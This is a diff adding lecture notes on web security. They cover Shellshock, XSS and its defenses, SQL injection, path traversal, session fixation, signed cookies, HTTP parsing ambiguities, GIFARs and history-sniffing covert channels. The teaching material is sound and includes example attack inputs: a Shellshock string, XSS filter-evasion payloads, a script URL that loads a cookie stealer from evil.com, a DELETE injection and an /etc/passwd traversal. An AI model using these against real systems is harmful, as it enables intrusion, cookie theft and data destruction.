@@ -1,0 +1,765 @@
+<h1>Web Security, part II</h1>
+
+<p>Last lecture, we looked at a core security
+mechanism for the web: the same-origin policy.</p>
+
+<p>In this lecture, we'll continue to look at
+how we can build secure web applications.</p>
+
+<p>The recent "Shell Shock" bug is a good example
+of how difficult it is to design web services
+that compose multiple technologies.</p>
+
+<p>A web client can include extra headers
+in its HTTP requests, and determine which
+query parameters are in a request. Example:</p>
+
+<pre><code>GET /query.cgi?searchTerm=cats HTTP 1.1
+Host: www.example.com
+Custom-header: Custom-value
+</code></pre>
+
+<p>CGI servers map the various components of the
+HTTP request to Unix environment variables.</p>
+
+<p><strong>Vulnerability:</strong> Bash has a parsing bug in the
+way that it handles the setting of environment
+variables! If a string begins with a certain
+set of malformed bytes, bash will continue to
+parse the rest of the string and execute any
+commands that it finds! For example, if you
+set an environment variable to a value like
+this...</p>
+
+<pre><code>() { :;};  /bin/id
+</code></pre>
+
+<p>...will confuse the bash parser, and cause
+it to execute the <code>/bin/id</code> command (which
+displays the UID and GID information for
+the current user).</p>
+
+<p>Live demo:</p>
+
+<pre><code>Step 1: Run the CGI server.
+  ./victimwebserver.py 8082
+
+Step 2: Run the exploit script.
+  ./shellshockclient.py localhost:8082 index.html
+</code></pre>
+
+<p>More information: http://seclists.org/oss-sec/2014/q3/650</p>
+
+<h2>Cross-site scripting (XSS) attacks</h2>
+
+<p>Shell Shock is a particular instance of
+security bugs which arise from <strong>improper
+content sanitzation.</strong> Another type of content
+sanitzation failure occurs during cross-site
+scripting attacks (XSS).</p>
+
+<p>Example: Suppose that a CGI script embeds
+a query string parameter in the HTML that
+it generates.</p>
+
+<p>Demo:</p>
+
+<pre><code>Step 1: Run the CGI server.
+   ./cgiServer.py
+
+Step 2: In browser, load these URLs:
+   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=hello
+   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=&lt;b&gt;hello&lt;/b&gt;
+   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=&lt;script&gt;alert("XSS");&lt;/script&gt;
+           //The XSS attack doesn't work for this one . . .
+           //we'll see why later in the lecture.
+
+   http://127.0.0.1:8282/cgi-bin/uploadRecv.py?msg=&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+
+           //This works! [At least on Chrome 37.0.2062.124.]
+           //Even though the browser caught the
+           //straightforward XSS injection, it
+           //incorrectly parsed our intentionally
+           //malformed HTML.
+           // [For more examples of XSS exploits via
+           //  malformed code, go here:
+           //      https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+           // ]
+</code></pre>
+
+<p>Why is cross-site scripting so prevalent?</p>
+
+<ul>
+<li>Dynamic web sites incorporate user content in
+HTML pages (e.g., comments sections).</li>
+<li>Web sites host uploaded user documents.
+<ul>
+<li>HTML documents can contain arbitrary
+Javascript code!</li>
+<li>Non-HTML documents may be content-sniffed
+as HTML by browsers.</li>
+</ul></li>
+<li>Insecure Javascript programs may directly
+execute code that comes from external parties
+(e.g., eval(), setTimeout(), etc.).</li>
+</ul>
+
+<h2>XSS defenses</h2>
+
+<ul>
+<li>Chrome and IE have a built-in feature which
+uses <strong>heuristics to detect potential cross-site
+scripting attacks.</strong>
+<ul>
+<li>Ex: Is a script which is about to execute
+included in the request that fetched the
+enclosing page?
+<ul>
+<li><code>http://foo.com?q=&lt;script src="evil.com/cookieSteal.js"/&gt;</code></li>
+</ul></li>
+<li>If so, this is strong evidence that something
+suspicious is about to happen! The attack
+above is called a "reflected XSS attack,"
+because the server "reflects" or "returns"
+the attacker-supplied code to the user's browser,
+executing it in the context of the victim
+page.
+<ul>
+<li>This is why our first XSS attack in
+the CGI example didn't work--the
+browser detected reflected JavaScript
+in the URL, and removed the trailing
+<code>&lt;/script&gt;</code> before it even reached the
+CGI server.</li>
+<li>However ...</li>
+</ul></li>
+<li><em>Filters don't have 100% coverage</em>,
+because there are a huge number of ways
+to encode an XSS attack!
+[https://www.owasp.org/index.php/XSS<em>Filter</em>Evasion<em>Cheat</em>Sheet]
+<ul>
+<li>This is why our second XSS attack
+succeeded---the browser got confused
+by our intentionally malformed HTML.</li>
+</ul></li>
+<li>Problem: Filters can't catch <strong>persistent XSS
+attacks</strong> in which the server saves
+attacker-provided data, which is then
+permanently distributed to clients.
+<ul>
+<li>Classic example: A "comments" section
+which allows users to post HTML
+messages.</li>
+<li>Another example: Suppose that a dating
+site allows users to include HTML in
+their profiles. An attacker can add
+HTML that will run in a <em>different</em>
+user's browser when that user looks
+at the attacker's profile! Attacker
+could steal the user's cookie.</li>
+</ul></li>
+</ul></li>
+<li>Another XSS defense: <strong>"httponly" cookies.</strong>
+<ul>
+<li>A server can tell a browser that client-side
+JavaScript should not be able to access
+a cookie. [The server does this by adding
+the "HttpOnly" token to a "Set-Cookie"
+HTTP response value.]</li>
+<li>This is only a partial defense, since the
+attacker can still issue requests that
+contain a user's cookies (CSRF).</li>
+</ul></li>
+<li><strong>Privilege separation:</strong> Use a separate domain
+for untrusted content.
+<ul>
+<li>For example, Google stores untrusted content
+in <code>googleusercontent.com</code> (e.g., cached
+copies of pages, Gmail attachments).</li>
+<li>Even if XSS is possible in the untrusted
+content, the attacker code will run in
+a different origin.</li>
+<li>There may still be problems if the content
+in googleusercontent.com points to URLs
+in google.com.</li>
+</ul></li>
+<li><strong>Content sanitization:</strong> Take untrusted content
+and encode it in a way that constrains how
+it can be interpreted.
+<ul>
+<li>Ex: <strong>Django templates:</strong> Define an output
+page as a bunch of HTML that has some
+"holes" where external content can be
+inserted.
+<ul>
+<li><a href="https://docs.djangoproject.com/en/dev/topics/templates/#automatic-html-escaping">Automatic HTML escaping in Django</a></li>
+</ul></li>
+<li>A template might contain code like
+this ...
+<ul>
+<li><code>&lt;b&gt;Hello {{ name }} &lt;/b&gt;</code></li>
+</ul></li>
+<li>... where "name" is a variable that is
+resolved when the page is processed by
+the Django template engine. That engine
+will take the value of "name" (e.g.,
+from a user-supplied HTTP query string),
+and then automatically escape dangerous
+characters. For example,
+<ul>
+<li>angle brackets <code>&lt;</code> and <code>&gt;</code> <code>--&gt; &amp;lt;</code> and <code>&amp;gt;</code></li>
+<li>double quotes <code>" --&gt; &amp;quot;</code></li>
+</ul></li>
+<li>This prevents untrusted content from
+injecting HTML into the rendered page.</li>
+<li>Templates cannot defend against all
+attacks! For example . . .
+<ul>
+<li><code>&lt;div class={{ var }}&gt;...&lt;/div&gt;</code></li>
+<li>if <code>var</code> equals <code>class1 onmouseover=javascript:func()</code></li>
+<li>...then there may be an XSS attack,
+depending on how the browser parses
+the malformed HTML.</li>
+</ul></li>
+<li>So, content sanitization kind-of works,
+but it's <strong>extremely difficult to parse
+HTML in an unambigous way.</strong></li>
+<li>Possibly better approach: Completely
+disallow externally-provided HTML,
+and force external content to be
+expressed in a smaller language
+(e.g., <a href="http://daringfireball.net/projects/markdown/syntax">Markdown</a>). 
+<ul>
+<li>Validated Markdown can then be translated
+into HTML.</li>
+</ul></li>
+</ul></li>
+<li><p><strong>Content Security Policy (CSP):</strong> Allows a web
+server to tell the browser which kinds of
+resources can be loaded, and the allowable
+origins for those resources.</p>
+
+<ul>
+<li><p>Server specifies one or more headers of
+the type <code>Content-Security-Policy</code>.</p>
+
+<pre><code>Content-Security-Policy: default-src 'self' *.mydomain.com
+// Only allow content from the page's domain
+// and its subdomains.
+</code></pre></li>
+<li><p>You can specify separate policies for
+where images can come from, where scripts
+can come from, frames, plugins, etc.</p></li>
+<li>CSP also prevents inline JavaScript, and
+JavaScript interfaces like <code>eval()</code> which
+allow for dynamic JavaScript generation.</li>
+</ul></li>
+<li>Some browsers allow servers to disable content-type
+sniffing (<code>X-Content-Type-Options: nosniff</code>).</li>
+</ul>
+
+<h2>SQL injection attacks</h2>
+
+<ul>
+<li>Suppose that the application needs to issue SQL
+query based on user input:
+<ul>
+<li><code>query = "SELECT * FROM table WHERE userid=" + userid</code></li>
+</ul></li>
+<li>Problem: adversary can supply <code>userid</code> that changes
+SQL query structure, e.g.,
+<ul>
+<li><code>"0; DELETE FROM table;"</code></li>
+</ul></li>
+<li>What if we add quoting around userid?
+<ul>
+<li><code>query = "SELECT * FROM table WHERE userid='" + userid + "'"</code></li>
+</ul></li>
+<li>The vulnerability still exists! The attacker
+can just add another quote as first byte
+of <code>userid</code>.</li>
+<li><strong>Real solution:</strong> unambiguously encode data.
+<ul>
+<li>Ex: replace ' with \', etc.</li>
+<li>SQL libraries provide escaping functions.</li>
+</ul></li>
+<li>Django defines a <strong>query abstraction layer</strong>
+which sits atop SQL and allows applications
+to avoid writing raw SQL (although they can
+do it if they really want to).</li>
+<li>(Possibly fake) German license plate which
+says ";DROP TABLE" to avoid speeding cameras
+which use OCR+SQL to extract license plate
+number.</li>
+</ul>
+
+<p>You can also run into problems if untrusted entities
+can supply filenames.</p>
+
+<ul>
+<li>Ex: Suppose that a web server reads files
+based on user-supplied parameters.
+<ul>
+<li><code>open("/www/images/" + filename)</code>
+Problem: filename might look like this:</li>
+<li><code>../../../../../etc/passwd</code></li>
+</ul></li>
+<li>As with SQL injection, the server must
+sanitize the user input: the server must
+reject file names with slashes, or encode
+the slashes in some way.</li>
+</ul>
+
+<h2>Django</h2>
+
+<ul>
+<li>Moderately popular web framework, used by
+some large sites like Instagram, Mozilla,
+and Pinterest.
+<ul>
+<li>A "web framework" is a software system
+that provides infrastructure for tasks
+like database accesses, session management,
+and the creation of templated content
+that can be used throughout a site.</li>
+<li>Other frameworks are more popular:
+PHP, Ruby on Rails.</li>
+<li>In the enterprise world, Java servlets
+and ASP are also widely used.</li>
+</ul></li>
+<li>Django developers have put some amount of
+thought into security.
+<ul>
+<li>So, Django is a good case study to
+see how people implement web security
+in practice.</li>
+</ul></li>
+<li>Django is probably better in terms of
+security than some of the alternatives
+like PHP or Ruby on Rails, but the devil
+is in the details.
+<ul>
+<li>As we'll discuss two lectures from now,
+researchers have invented some frameworks
+that offer provably better security.
+[Ur/Web: http://www.impredicative.com/ur/]</li>
+</ul></li>
+</ul>
+
+<h2>Session management: cookies </h2>
+
+<p><a href="http://pdos.csail.mit.edu/papers/webauth:sec10.pdf">Dos and Don'ts of Client Authentication on the Web</a></p>
+
+<p>Zoobar, Django, and many web frameworks put a
+<strong>random session ID</strong> in the cookie.</p>
+
+<ul>
+<li>The Session ID refers to an entry in some session
+table on the web server. The entry stores a bunch
+of per-user information.</li>
+<li>Session cookies are <em>sensitive</em>: adversary can use
+them to impersonate a user!
+<ul>
+<li>As we discussed last lecture, the same-origin
+policy helps to protect cookies ...</li>
+<li>... but you <strong>shouldn't share a domain with
+sites that you don't trust!</strong> Otherwise, those
+sites can launch a <strong>session fixation</strong> attack:
+<ol>
+<li>Learn more on <a href="https://en.wikipedia.org/wiki/Session_fixation">Wikipedia, Session fixation</a></li>
+<li>Attacker gets victim to visit a link or a website
+that sets the attacker specified session ID in the victim's
+cookie.</li>
+<li>Attacker can exploit a server that accepts any 
+session identifier from query strings and give
+the victim a URL like <code>lol.com/?PHPSID=abcd</code>
+<ul>
+<li>The session ID can be chosen by the attacker
+or returned by the server when the attacker
+logs in.</li>
+</ul></li>
+<li>Or, attacker can exploit a browser vulnerability
+that allows <code>a.example.com</code> to set a cookie for 
+<code>b.example.com</code>. Attacker gets victim to visit
+his website <code>b.website.com</code>, which sets the 
+cookie for the victim's <code>a.website.com</code></li>
+<li>User navigates to the victim site;
+the attacker-choosen session ID is
+sent to the server and used to
+identify the user's session entry.</li>
+<li>Later, the attacker can navigate
+to the victim site using the
+attacker-chosen session id, and
+access the user's state!</li>
+<li>There's a <strong>big if</strong> here. This attack
+only works on clueless victims who do not
+notice that the account they are logged into
+is not theirs.</li>
+</ol></li>
+</ul></li>
+<li>Hmmm, but what if we don't want to have server-side
+state for every logged in user?</li>
+</ul>
+
+<h2>Stateless cookies</h2>
+
+<ul>
+<li><p>If you don't have the notion of a session, then
+you need to authenticate every request!</p>
+
+<ul>
+<li><strong>Idea:</strong> Authenticate the cookie using cryptography.</li>
+<li>Primitive: Message authentication codes (MACs)
+<ul>
+<li>Think of it like a keyed hash, e.g.,
+<code>HMAC-SHA1: H(k, m)</code></li>
+<li>Client and server share a key; client
+uses key to produce the message, and
+the server uses the key to verify the
+message.</li>
+</ul></li>
+<li><p>AWS S3 REST Services use this kind of cookie: 
+<a href="http://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html">REST Authentication</a>.</p>
+
+<ul>
+<li><p>Amazon gives each developer an AWS Access
+Key ID, and an AWS secret key. Each request
+looks like this:</p>
+
+<pre><code> GET /photos/cat.jpg HTTP/1.1
+ Host: johndoe.s3.amazonaws.com
+ Date: Mon, 26 Mar 2007 19:37:58 +0000
+ Authorization: AWS AKIAIOSFODNN7EXAMPLE:frJIUN8DYpKDtOLCwoyllqDzg=
+                  |___________________| |________________________|
+                      Access key ID            MAC signature
+</code></pre></li>
+<li><p>Here's what is signed (this is slightly
+simplified, see the link above for the
+full story):</p>
+
+<pre><code> StringToSign = 
+      HTTP-Verb     + "\n" +
+      Content-MD5   + "\n" +
+      Content-Type  + "\n" +
+      Date          + "\n" +
+      ResourceName
+</code></pre></li>
+</ul></li>
+<li><p>Note that this kind of cookie doesn't expire in
+the traditional sense (although the server will
+reject the request if Amazon has revoked the
+user's key).</p>
+
+<ul>
+<li><p>You can embed an "expiration" field in
+a <em>particular</em> request, and then hand
+that URL to a third-party, such that,
+if the third-party waits too long, AWS
+will reject the request as expired.</p>
+
+<pre><code> AWSAccessKeyId=AKIAIOSFODNN7EXAMPLE&amp;Expires=1141889120&amp;Signature=vjbyPxybd...
+                                   |__________________|
+                                  Included in the string
+                                  that's covered by the
+                                  signature!
+</code></pre></li>
+</ul></li>
+<li><p>Note that the format for the string-to-hash
+should provide unambiguous parsing!</p>
+
+<ul>
+<li>Ex: No component should be allowed to
+embed the escape character, otherwise
+the server-side parser may get confused.</li>
+</ul></li>
+</ul></li>
+<li><p><strong>Q:</strong> How do you log out with this kind of cookie design?
+<strong>A:</strong> Impossible, if the server is stateless (closing
+a seesion would require a server-side table
+of revoked cookies).</p>
+
+<ul>
+<li>If server can be stateful, session IDs make
+this much simpler.</li>
+<li>There's a fundamental trade-off between
+reducing server-side memory state and
+increasing server-side computation overhead
+for cryptography.            </li>
+</ul></li>
+</ul>
+
+<h2>Alternatives to cookies for session management</h2>
+
+<ul>
+<li>Use <strong>HTML5 local storage</strong>, and implement your own
+authentication in Javascript.
+<ul>
+<li>Some web frameworks like Meteor do this.</li>
+<li>Benefit: The cookie is not sent over the
+network to the server.</li>
+<li>Benefit: Your authentication scheme is not
+subject to complex same-origin policy for
+cookies (e.g., DOM storage is bound to
+a single origin, unlike a cookie, which
+can be bound to multiple subdomains).</li>
+</ul></li>
+<li><strong>Client-side X.509 certificates.</strong>
+<ul>
+<li>Benefit: Web applications can't steal
+or explicitly manipulate each other's
+certificates.</li>
+<li><strong>Drawback:</strong> Have weak story for revocation
+(we'll talk about this more in future
+lectures).</li>
+<li><strong>Drawback:</strong> Poor usability---users don't
+want to manage a certificate for each
+site that they visit!</li>
+<li><strong>Benefit/drawback:</strong> There isn't a notion of
+a session, since the certificate is "always
+on." For important operations, the application
+will have to prompt for a password.</li>
+</ul></li>
+</ul>
+
+<h2>HTTP protocol ambiguities</h2>
+
+<p>The web stack has some protocol ambiguities
+that can lead to security holes.</p>
+
+<ul>
+<li><p>HTTP header injection from XMLHttpRequests</p>
+
+<ul>
+<li><p>Javascript can ask browser to add extra
+headers in the request. So, what happens
+if we do this?</p>
+
+<pre><code> var x = new XMLHttpRequest();
+ x.open("GET", "http://foo.com");
+ x.setRequestHeader("Content-Length", "7");
+
+
+ // Overrides the browser-computed field!
+ x.send("Gotcha!\r\n" +
+ "GET /something.html HTTP/1.1\r\n" +
+ "Host: bar.com");
+</code></pre></li>
+<li><p>The server at foo.com may interpret this as
+two separate requests! Later, <strong>when the browser
+receives the second request, it may overwrite
+a cache entry belonging to bar.com with content
+from foo.com!</strong></p></li>
+<li><strong>Solution:</strong> Prevent XMLHttpRequests from setting
+sensitive fields like <code>Host:</code> or <code>Content-Length</code>.</li>
+<li><strong>Takehome point:</strong> Unambiguous encoding is
+critical! Build reliable escaping/encoding!</li>
+</ul></li>
+<li>URL parsing ("The Tangled Web" page 154)
+<ul>
+<li>Flash had a slightly different URL parser than
+the browser.</li>
+<li>Suppose the URL was http://example.com:80@foo.com/
+<ul>
+<li>Flash would compute the origin as
+"example.com".</li>
+<li>Browser would compute the origin as
+"foo.com".</li>
+</ul></li>
+<li><strong>Bad idea:</strong> complex parsing rules just to
+determine the principal.</li>
+<li><strong>Bad idea:</strong> re-implementing complex parsing
+code.</li>
+</ul></li>
+<li><p>Here's a <strong>hilarious/terrifying</strong> way to launch
+attacks using Java applets that are stored
+in the .jar format.</p>
+
+<ul>
+<li><p>In 2007, Lifehacker.com posted an article
+which described how you could hide .zip
+files inside of .gif files.</p>
+
+<ul>
+<li>Leverage the fact that image renderers
+process a file top-down, whereas decompressors
+for .zip files typically start from the end
+and go upwards.</li>
+<li>Attackers realized that .jar files are
+based on the .zip format!</li>
+<li><strong>THUS THE <em>GIFAR</em> WAS BORN</strong>: half-gif, half-jar,
+all-evil.</li>
+<li>Really simple to make a GIFAR: Just
+use "cat" on Linux or "cp" on Windows.</li>
+<li>Suppose that target.com only allows
+external parties to upload images
+objects. The attacker can upload a
+GIFAR, and the GIFAR will pass
+target.com's image validation tests!</li>
+<li><p>Then, if the attacker can launch
+a XSS attack, the attacker can
+inject HTML which refers to the
+".gif" as an applet.</p>
+
+<pre><code> &lt;applet code="attacker.class"
+        archive="attacker.gif"
+        ...&gt;
+</code></pre></li>
+<li><p>The browser will load that applet
+and give it the authority of
+target.com!</p></li>
+</ul></li>
+</ul></li>
+</ul>
+
+<h2>Covert channel attacks</h2>
+
+<p>Web applications are also vulnerable to covert channel
+attacks.</p>
+
+<ul>
+<li>A <strong>covert channel</strong> is a mechanism which allows two
+applications to exchange information, even though
+the security model prohibits those applications
+from communicating.
+<ul>
+<li>The channel is "covert" because it doesn't
+use official mechanisms for cross-app
+communication.</li>
+</ul></li>
+<li><strong>Example #1: CSS-based sniffing attacks</strong>
+<ul>
+<li>Attacker has a website that he can convince
+the user to visit.</li>
+<li><strong>Attacker goal:</strong> Figure out the other websites
+that the user has visited (e.g., to determine
+the user's political views, medical history,
+etc.).</li>
+<li><strong>Exploit vector:</strong> A web browser uses different
+colors to display visited versus unvisited
+links! So, attacker page can generate a
+big list of candidate URLs, and then inspect
+the colors to see if the user has visited
+any of them.
+<ul>
+<li>Can check thousands of URLs a second!</li>
+<li>Can go breadth-first, find hits for
+top-level domains, then go depth-first
+for each hit.</li>
+</ul></li>
+<li><strong>Fix:</strong> Force getComputedStyle() and related
+JavaScript interfaces to always say that a
+link is unvisited. [https://blog.mozilla.org/security/2010/03/31/plugging-the-css-history-leak/]</li>
+</ul></li>
+<li><strong>Example #2: Cache-based attacks</strong>
+<ul>
+<li>Attacker setup and goal are the same as before.</li>
+<li><strong>Exploit vector:</strong> It's much faster for a browser
+to access data that's cached instead of fetching
+it over the network. So, attacker page can
+generate a list of candidate images, try to
+load them, and see which ones load quickly!</li>
+<li>This attack can reveal your location if the
+candidate images come from geographically
+specific images, e.g., Google Map tiles.
+[http://w2spconf.com/2014/papers/geo_inference.pdf]</li>
+<li><strong>Fix:</strong> No good ones. A page could never cache
+objects, but this will hurt performance. But
+suppose that a site doesn't cache anything.
+Is it safe from history sniffing? No!</li>
+</ul></li>
+<li><strong>Example #3: DNS-based attacks</strong>
+<ul>
+<li>Attacker setup and goal are the same as
+before.</li>
+<li><strong>Exploit vector:</strong> Attacker page generates
+references to objects in various domains.
+If the user has already accessed objects
+from that domain, the hostnames will already
+reside in the DNS cache, making subsequent
+object accesses faster! [http://sip.cs.princeton.edu/pub/webtiming.pdf]</li>
+<li><strong>Fix:</strong> No good ones. Could use raw IP addresses
+for links, but this breaks a lot of things
+(e.g., DNS-based load balancing). However,
+suppose that a site doesn't cache anything
+and uses raw IP addresses for hostnames. Is
+it safe from history sniffing? No!</li>
+</ul></li>
+<li><strong>Example #4: Rendering attacks.</strong>
+<ul>
+<li>Attacker setup and goal are the same as before.</li>
+<li><strong>Exploit vector:</strong> Attacker page loads a candidate
+URL in an iframe. Before the browser has fetched
+the content, the attacker page can access ...
+<code>window.frames[1].location.href</code>
+... and read the value that the attacker set.
+However, once the browser has fetched the
+content, accessing that reference will return
+"undefined" due to the same-origin policy. So,
+the attacker can poll the value and see how
+long it takes to turn "undefined". If it takes
+a long time, the page must not have been
+cached! [http://lcamtuf.coredump.cx/cachetime/firefox.html]</li>
+<li><strong>Fix:</strong> Stop using computers?</li>
+</ul></li>
+</ul>
+
+<p>A web page also needs to use postMessage() securely.</p>
+
+<ul>
+<li>Two frames from different origins can use postMessage()
+to asynchronously exchange immutable strings.
+<ul>
+<li>Sender gets a reference to a window object,
+and does this:
+window.postMessage(msg, origin);</li>
+<li>Receiver defines an event handler for the
+special "message" event. The event handler
+receives the msg and the origin.</li>
+</ul></li>
+<li><strong>Q:</strong> Why does the receiver have to check the
+origin of received message?</li>
+<li><strong>A:</strong> To perform access control on senders! If the
+receiver implements sensitive functionality,
+it shouldn't respond to requests from arbitary
+origins.
+<ul>
+<li><strong>Common mistake:</strong> The receiver uses regular
+expressions to check the sender's origin.</li>
+<li>Even if origin matches /.foo.com/, doesn't
+mean it's from foo.com! Could be "xfoo.com", 
+or "www.foo.com.bar.com".
+<ul>
+<li>More details: <a href="https://www.cs.utexas.edu/~shmat/shmat_ndss13postman.pdf">The Postman Always Rings Twice</a></li>
+</ul></li>
+</ul></li>
+<li><strong>Q:</strong> Why does the sender have to specify the
+intended origin of the receiver?</li>
+<li><strong>A:</strong> postMessage() is applied to a window, not an
+origin.
+<ul>
+<li>Remember that an attacker may be able to
+navigate a window to a different location.</li>
+<li>If the attacker navigates the window,
+another origin may receive message!</li>
+<li>If the sender explictly specifies a target
+origin, the browser checks recipient origin
+before delivering the msg.
+<ul>
+<li>More details: <a href="http://css.csail.mit.edu/6.858/2013/readings/post-message.pdf">Securing Frame Communication in Browsers</a></li>
+</ul></li>
+</ul></li>
+</ul>
+
+<p>There are many other aspects to building a
+secure web application.</p>
+
+<ul>
+<li>Ex: ensure proper access control for server-side
+operations.
+<ul>
+<li>Django provides Python decorators to
+check access control rules.</li>
+</ul></li>
+<li>Ex: Maintain logs for auditing, prevent
+an attacker from modifying the log.</li>
+</ul>
